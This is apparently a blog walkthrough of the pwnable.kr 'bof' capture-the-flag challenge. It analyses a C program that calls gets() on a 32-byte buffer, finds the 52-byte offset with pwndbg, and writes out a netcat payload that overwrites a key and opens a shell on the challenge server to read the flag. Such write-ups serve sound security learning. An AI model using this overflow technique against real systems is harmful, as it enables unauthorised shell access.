---
title: "pwnable.kr walkthrough 03: bof"
date: 2024-10-23T20:30:46-05:00
draft: false
author: "Nathan Higley"
authorLink: ""
description: ""

tags: [linux, pwn, ctf]
categories: [pwn, ctf, linux]

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""

series: ["pwnable.kr"]
series_order: 3
---

# bof

For this challenge, we are presented with a bit different prompt than before.

We now just simply get source code and a binary, as well as a netcat connection to connect to to exploit it remotely.

## Source Code Analysis

Looking at `bof.c` we see this:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

This is a pretty classic challenge.  Since the program is calling the vulnerable function `gets()` and reading it into a 32 byte buffer, we need to provide 32 bytes to fill the buffer, and then at some offset we should be able to overwrite the key variable with the needed value of `0xcafebabe`

## Finding the Offset

Using the amazing [pwndbg](https://pwndbg.re/) we can easily find this offset.

First load the binary into pwndbg:
```c
pwndbg ./bof
```

Then generate a payload with the cyclic command:
```c
pwndbg> cyclic 200
<payload>
```

Now disassemble the `func()` function:
```c
pwndbg> disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e054b0 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e04a00 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7dde3e0 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e054b0 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7ebca80 <__stack_chk_fail>
   0x56555688 <+92>:    leave
   0x56555689 <+93>:    ret
End of assembler dump.
```
The spot we need is the where the program compares the value to `0xcafebabe`:
```c
0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```
So let's set a breakpoint there and then run the program
```c
pwndbg> b *func+40
pwndbg> r
```
Then paste in the cyclic payload.

Now here, we need to look at 8 bytes from the $ebp register:
```c
pwndbg> x/4x $ebp+8
0xffffbce0:     0x6161616e      0x6161616f      0x61616170      0x61616171
```

And then we can calculate the offset:
```c
pwndbg> cyclic -l 0x6161616e
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 52
```

## Writing The Exploit

So we now know we need to write 52 bytes and then the required four bytes `0xcafebabe`

A good way to do this would be (remember to reverse the endianness of the hex bytes):
```sh
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" | nc pwnable.kr 9000
```

When we test this, oddly the program hangs.  What is really happening is that netcat is closing the connection.

A good way to resolve this is to add an extra cat command after our echo so that netcat will continue to keep the connection open and connect stdin and stdout to the netcat connection:
```sh
(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" && cat) | nc pwnable.kr 9000
```

And running this we get the flag:
```sh
$ (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca" && cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
super.pl
cat flag
<FLAG>
```



